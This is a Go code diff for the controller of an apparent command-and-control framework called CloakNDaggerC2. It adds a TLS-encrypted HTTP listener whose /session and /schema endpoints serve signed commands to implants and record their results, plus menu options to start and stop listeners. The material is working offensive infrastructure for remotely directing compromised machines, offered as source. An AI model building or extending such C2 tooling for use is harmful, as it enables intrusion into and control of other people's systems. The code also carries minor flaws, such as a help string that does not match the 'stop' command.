@@ -20,6 +20,7 @@ import (
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
+	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
 	"encoding/pem"
@@ -27,7 +28,9 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"net/http"
 	"strings"
+	"sync"
 	"time"
 
 	pb "CloakNDaggerC2/dagger/proto/daggerProto"
@@ -35,6 +38,8 @@ import (
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
 )
+
+var stopServers chan struct{}
 
 type impInfo struct {
 	UUID        string
@@ -45,6 +50,115 @@ type impInfo struct {
 	LastCheckIn string
 	Result      string
 	GotIt       int32
+}
+
+func startListener(address, port string, wg *sync.WaitGroup) (uint32, error) {
+	defer wg.Done()
+
+	conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
+	if err != nil {
+		log.Fatalf("did not connect : %v", err)
+	}
+
+	defer conn.Close()
+
+	c := pb.NewUpdateRecordClient(conn)
+
+	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
+
+	defer cancel()
+
+	serverAddr := address + ":" + port
+	certFile := "server.crt"
+	keyFile := "server.key"
+
+	cert, err := tls.LoadX509KeyPair(certFile, keyFile)
+	if err != nil {
+		return 1, err
+	}
+
+	tlsConf := &tls.Config{Certificates: []tls.Certificate{cert}}
+
+	listener, err := tls.Listen("tcp", serverAddr, tlsConf)
+
+	if err != nil {
+		return 1, err
+	}
+
+	http.HandleFunc("/session", func(w http.ResponseWriter, r *http.Request) {
+		// Session handles the implant requesting a command
+		// This will return information
+		// Need to use the UUID to get the command in the DB
+		UUID := r.Header.Get("APPSESSIONID")
+		fmt.Printf("UUID: %s requesting command \n", UUID)
+
+		_, err := UUID_info(UUID)
+		// We check if it exists and, if not, then we break out of the loop
+		// err should be nil if the UUID exists
+		if err != nil {
+			fmt.Println("No such UUID")
+		}
+
+		res, err := UUID_info(UUID)
+		if err != nil {
+			fmt.Println(err)
+		}
+
+		w.Header().Set("Verifier", res.Signature)
+		fmt.Fprintln(w, res.Command)
+
+	})
+
+	http.HandleFunc("/schema", func(w http.ResponseWriter, r *http.Request) {
+		// schema handles implants returning information
+		// This will need to get information from the body of the request
+		// That info is then fed into the API
+		UUID := r.Header.Get("APPSESSIONID")
+		Res := r.Header.Get("Res")
+		fmt.Printf("UUID: %s checking in with result: %s \n", UUID, Res)
+
+		data := impInfo{
+			// The issue I'm envisioning, I want to preserve the whoami and lastcheckin vals
+			// In Python I was just running native DB queries and saving those vals to vars
+			// With the API this will be more intensive and cumbersome
+			// Right now we're ignoring the problem
+			UUID: UUID, Whoami: "", Signature: "", Retrieved: 0, Command: "", LastCheckIn: "", Result: Res, GotIt: 1,
+		}
+
+		res, err := c.SendUpdate(ctx, &pb.UpdateObject{UUID: data.UUID, Whoami: data.Whoami, Signature: data.Signature,
+			Retrieved: data.Retrieved, Command: data.Command, LastCheckIn: data.LastCheckIn, Result: data.Result,
+			GotIt: data.GotIt})
+
+		code := res.GetCode()
+
+		if code != 0 {
+			// We don't want to break on errors here, ideally we should continue to serve
+			fmt.Printf("Error: %e", err)
+		}
+
+	})
+
+	server := &http.Server{}
+
+	go func() {
+		err := server.Serve(listener)
+		if err != nil {
+			log.Fatal(err)
+		}
+	}()
+
+	<-stopServers
+
+	ctx, cancel = context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	err = server.Shutdown(ctx)
+	if err != nil {
+		return 1, err
+	}
+
+	return 0, nil
+
 }
 
 func sign(command string) (string, error) {
@@ -189,11 +303,15 @@ func build(platform, arch, name, listener string) (uint16, error) {
 }
 
 func main() {
+	// The controller should start the listener, API, and builder servers when it starts
 	red := "\033[31m"
 	green := "\033[32m"
 	yellow := "\033[33m"
 	blue := "\033[34m"
 	reset := "\033[0m"
+	var wg sync.WaitGroup
+	stopServers = make(chan struct{})
+
 	for {
 		var input string
 		for {
@@ -317,6 +435,24 @@ func main() {
 				}
 				fmt.Printf("Command set \n")
 
+			case "5":
+				var address, port string
+				fmt.Printf("Listeners \n")
+				fmt.Printf("Start a listener \n")
+				fmt.Println("Enter the listener address > ")
+				fmt.Scan(&address)
+				if address == "exit" {
+					break
+				}
+				fmt.Println("Enter the port to use > ")
+				fmt.Scan(&port)
+				wg.Add(1)
+				go startListener(address, port, &wg)
+
+			case "stop":
+				close(stopServers)
+				break
+
 			case "help":
 				fmt.Printf("Help menu \n")
 				fmt.Printf("The interpreter expects 1 - 4 as commands \n")
@@ -325,6 +461,7 @@ func main() {
 				fmt.Printf("3 will you to list all implants in the DB \n")
 				fmt.Printf("4 allows you to interact with implants by setting commands \n")
 				fmt.Printf("5 will let you start a listener on an address and port combo \n")
+				fmt.Println("stop_listeners will close all open listeners")
 				fmt.Printf("'help' will bring you to this menu \n")
 
 			default:
@@ -335,6 +472,7 @@ func main() {
 				fmt.Printf("3 will you to list all implants in the DB \n")
 				fmt.Printf("4 allows you to interact with implants by setting commands \n")
 				fmt.Printf("5 will let you start a listener on an address and port combo \n")
+				fmt.Println("stop_listeners will close all open listeners")
 				fmt.Printf("'help' will bring you to this menu \n")
 			}
 		}
